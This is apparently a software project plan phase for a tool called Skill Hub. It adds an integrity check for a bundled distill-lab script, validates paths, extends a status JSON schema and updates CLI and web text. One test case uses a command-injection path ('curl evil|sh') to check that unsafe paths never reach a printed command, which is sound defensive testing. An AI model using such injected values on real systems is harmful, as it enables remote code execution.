---
phase: 6
title: "Product text and tests (Go, web, e2e, one screenshot)"
status: done
priority: P2
effort: "5.5h"
wave: 3
dependencies: [1, 4]
---

# Phase 6: Product text and tests (Go, web, e2e, one screenshot)

<!-- Red team: moved from wave 1 to wave 3. It needs the bundle API (Phase 1) for the integrity gate and shares
`internal/app/curation_home.go` with Phase 4 (which edits lines 150-157), so it runs after Phase 4. Effort raised
from 4h to 5h for structured action fields, the integrity gate, the id check and Windows rendering. -->
<!-- Validation: effort 5h -> 5.5h; this phase owns the status JSON schema as a public contract change. Release is
0.5.0 (was written 5.0.0). -->

## Context (traced on main `ef535de`, pre-0.5.0; re-verify at start)

These edits land after the onboarding plan's edits to `curation_home.go`, `next_commands.go` and its mechanical
renames in docs, web and `source.go` (plan.md "Sequencing"); that plan leaves the distill sentences untouched.
Re-read each file on the new main before editing; the line numbers below are from before 0.5.0.

- `internal/app/curation_home.go:476-488`: `review_lessons` summary "using the distill-lab skill's distill.py
  script" (`:480,482`) and command `distill.py list` + `" " + state.TopCandidateSkillPath` (`:484-487`), the path
  unquoted. `ActionItem` has `Kind, ID, Count, Priority, Summary, Command` (`:46-53`). The path comes from
  `countCandidateLessons`, a `filepath.Glob` over `skills/*/*/.meta/distill.yaml` with no name check (`:321-328`).
  Test: `internal/app/curation_home_test.go:616-637`.
- <!-- Validation: status JSON schema --> `skillhub status --json` is validated against
  `schemas/curation-home-v1.schema.json` by `internal/delivery/cli/status_schema_test.go:27`. Its `actionItem`
  (`:59-65`) has `"additionalProperties": false`, requires `kind`, `priority`, `summary` and `command`, and allows
  only `kind`, `id`, `count`, `priority`, `summary`, `command`. So new fields fail the test unless the schema
  changes; the schema is a public contract (`docs/design/web-ux-scorecard.md:184` calls it one).
- <!-- Red team: review_lessons over MCP --> The same `CurationHome` is returned by the MCP tool `hub_status`
  (`internal/delivery/mcpserver/workspace_tools.go:30-32`), which an agent may call from a project folder, so a
  hub-relative command run from the agent's own folder would execute that folder's
  `.agents/skills/distill-lab/scripts/distill.mjs`.
- Status renders action commands with `cliNextCommand` (`internal/delivery/cli/curation.go:97-101`); a command not
  starting with `skillhub ` and not a known token is returned as is (`internal/delivery/cli/next_commands.go:156-159`);
  `shellArgument` quotes POSIX-style with single quotes (`:176-181`). <!-- Red team: Windows next step --> Single
  quotes do not quote in `cmd.exe`, and Windows PowerShell 5.1 has no `&&`; Windows is a CI target
  (`.github/workflows/ci.yml:14-18`).
- Canonical id pattern `^[a-z0-9][a-z0-9-]{0,62}$` (`internal/canonical/skill.go:22`); confirm the collection id
  pattern at start.
- Source watch confirmation: `internal/app/source.go:738` and `internal/delivery/cli/source.go:717` say "Distill
  with distill-lab to write .meta/distill.yaml ..."; test `internal/delivery/cli/source_test.go:214-215` checks
  for "distill-lab".
- Web: `web/src/domain/handoff-brief.ts:10-28` (brief text, built in the browser from sources only; it has no
  workspace or integrity data), test `handoff-brief.test.ts:5-17` (asserts `distill.py` at `:17`);
  `web/src/screens/skill-detail/DistillTab.tsx:10-11` (`NOTE_DECIDE`, prints `distill.py decide ...`);
  `web/src/screens/distill/DistillHandoffScreen.tsx:24-25` (`INTRO_BRIEF`), test `distill.test.tsx:110,121`;
  e2e `web/e2e/tier3.spec.ts:45,64`, `web/e2e/journeys.spec.ts:229` assert "Use the distill-lab skill".
- <!-- Red team: fact check, distill_model.go --> `internal/distill/distill_model.go:39,119,184` name `distill.py`
  (three comments, not one).
- Screenshot `docs/images/web/distill-handoff.png` shows `INTRO_BRIEF`; the harness re-shoots all images into a
  folder (`make web-shots SHOTS_OUT_DIR=...`, see `archive/plans/261011-1432-readme-and-user-docs-rewrite/phase-11-home-copy-fix.md`).

## Owned files

See plan.md wave 3, Phase 6 row, which includes `schemas/curation-home-v1.schema.json`
(<!-- Validation: status JSON schema -->`actionItem` only). Read-only: `internal/hostintegration/**`, `internal/systemskills/**`
(uses `SystemSkills()`), `web/e2e/ux/*`, `internal/app/curation_home.go:150-157` (Phase 4).

## Requirements

Script path (fixed by plan decisions 1 and 12): `.agents/skills/distill-lab/scripts/distill.mjs`, relative to the
hub. <!-- Red team: tampered bundle still advertised and run --> The only product output that prints a runnable
script command is the `review_lessons` action; the web texts name the skill and its script without a command line,
so no command is advertised that Skill Hub has not checked.

1. **Integrity gate** (new `internal/app/distill_lab_intact.go`): `distillLabIntact(root) bool` is true only when
   every file of the distill-lab bundle (`systemskills.SystemSkills()`) exists under
   `<root>/.agents/skills/distill-lab/` with bytes equal to the *current* bundle, read with `Lstat` and no symlink
   component. When false, the `review_lessons` action keeps its count and summary but has no command, and its
   summary ends with "; distill-lab in this hub differs from Skill Hub's copy, run `skillhub doctor`".
2. **Path check.** <!-- Red team: unquoted path --> `countCandidateLessons` chooses `TopCandidateSkillPath` only
   among files whose collection and skill folder names match the canonical id pattern; other files still count
   toward the totals but never appear in a command. So the path holds only `[a-z0-9-/.]` and needs no quoting.
3. **Structured action** <!-- Red team: review_lessons over MCP --> (`curation_home.go`): `ActionItem` gains
   `Script string \`json:"script,omitempty"\``, `File string \`json:"file,omitempty"\`` and
   `HubRelative bool \`json:"hub_relative,omitempty"\``. For `review_lessons`: `Script =
   ".agents/skills/distill-lab/scripts/distill.mjs"`, `File = <hub-relative distill.yaml path>`, `HubRelative =
   true`, and `Command = "node .agents/skills/distill-lab/scripts/distill.mjs list <file>"` documented in the JSON
   and MCP field description as "run from the hub folder". Summary: "%d candidate lesson(s) ready for review with
   the distill-lab skill in the hub folder" (+ the high-value variant). Keep `Kind`, `ID`, `Count`, `Priority`.
   <!-- Validation: status JSON schema --> Schema: add `"script": {"type": "string"}`, `"file": {"type": "string"}`
   and `"hub_relative": {"type": "boolean"}` to `actionItem.properties` in `schemas/curation-home-v1.schema.json`;
   keep `additionalProperties: false`, the `required` list and the `$id` (adding optional properties keeps every
   existing document valid, so the version stays `v1`). `command` stays required: when the integrity gate
   (requirement 1) withholds the command, the JSON carries `"command": ""` (the field has no `omitempty`), and
   `script`, `file` and `hub_relative` are omitted.
4. **CLI rendering** (`curation.go`, function `reviewLessonsCommand(action, workspace, goos string)`): build the
   command from `Script` and `File` with absolute paths, so it is correct from any folder:
   - POSIX: `node <shellArgument(abs script)> list <shellArgument(abs file)>`;
   - Windows: `node "<abs script with \>" list "<abs file with \>"` (no `&&`, no `cd`; double quotes work in `cmd`
     and PowerShell). If the hub path contains `"`, `%`, `$` or `` ` ``, print two lines instead: "In <hub>:" and
     the hub-relative command.
   All other action kinds unchanged.
5. `source.go` and `cli/source.go` (same sentence in both): "Watching <id>. To learn from it, start an agent in
   this hub folder and ask it to distill with the distill-lab skill; it writes .meta/distill.yaml. Porting lessons
   to skill content uses skill_update.\nWatching does not auto-import skills."
6. `handoff-brief.ts`: keep the first line "Use the distill-lab skill ..." (e2e anchor). Add before the list:
   "Run this in an agent started in the Skill Hub folder; Skill Hub installs the distill-lab skill there. It needs
   Node 18 or newer." Step 2: "Record the lessons in the skill's .meta/distill.yaml with the distill-lab skill's
   script, as its 'Running the script' section shows. Do not edit the skill itself and do not commit."
7. `DistillHandoffScreen.tsx` `INTRO_BRIEF`: "Copy this handoff and paste it to an agent you start in your Skill
   Hub folder, where Skill Hub installs the distill-lab skill. It records lessons in each skill; read them in the
   skill's Distill tab, where you decide what to keep."
8. `DistillTab.tsx` `NOTE_DECIDE`: replace the script sentence with "Or run the distill-lab script's decide
   command yourself in your hub folder; the skill's 'Running the script' section shows it."
9. `distill_model.go:39,119,184`: point the comments at `.agents/skills/distill-lab/scripts/distill.mjs` (the
   editable source in this repo, plan decision 3).
10. Screenshot: re-shoot into a scratch folder and copy only `distill-handoff.png` and its manifest entry (same
    recipe as the archived Phase 11); skip with a note if the harness fails, and report.

## Tests

- `curation_home_test.go`: exact new command, `Script`, `File`, `HubRelative` and summary; a tampered
  `distill.mjs` (one byte changed) or a missing bundle file -> no command and the doctor hint in the summary; a
  candidate under `skills/x;curl evil|sh;/id/` counts but never appears in `File` or `Command`.
- `workspace_next_steps_test.go`: status output shows `node '<ws>/.agents/.../distill.mjs' list '<ws>/skills/...'`
  for a workspace path with a space; a table test of `reviewLessonsCommand` with `goos = "windows"` and
  `C:\Users\me\skill hub` gives the double-quoted form with no `&&`, and a hub path containing `%` gives the
  two-line form.
- MCP-shaped consumer: the `hub_status` JSON carries `script`, `file` and `hub_relative: true`.
- <!-- Validation: status JSON schema --> `status_schema_test.go` passes with a hub that has candidate lessons (new
  fields present) and with a tampered distill-lab (empty `command`, no new fields); a test document with an
  unknown `actionItem` property still fails.
- `source_test.go`: still contains "distill-lab"; add "hub folder".
- `handoff-brief.test.ts`: contains "Use the distill-lab skill", "Skill Hub folder", "Node 18"; contains neither
  `distill.py` nor a script path.
- `distill.test.tsx`: intro mentions the hub folder.
- e2e: existing anchors unchanged; add one assertion for "Skill Hub folder" in `tier3.spec.ts`.
- `git grep -n "distill.py" -- internal web/src web/e2e ':!internal/migration/testdata'` returns nothing (the
  fixtures keep the header the Python script wrote).

## Steps

1. Go changes and tests; `go test ./internal/app/... ./internal/delivery/cli/... ./internal/distill/...`.
2. Web changes and tests; `make web-test`; `make web-e2e` (or the repo's e2e target) for the two specs.
3. Screenshot refresh.
4. Commits: `fix(curation): print a runnable distill-lab command only for an intact skill`,
   `fix(web): tell the user to run the distill handoff in the hub folder`.

## Risks

- JSON/MCP consumers that parsed the old `distill.py list` command: the field is free text and three structured
  fields are added; documented in the release notes by the docs phase.
- A hub where distill-lab was edited on purpose loses the printed command: intended; doctor explains why.

## Rollback

Revert the commits (code, tests and image together).
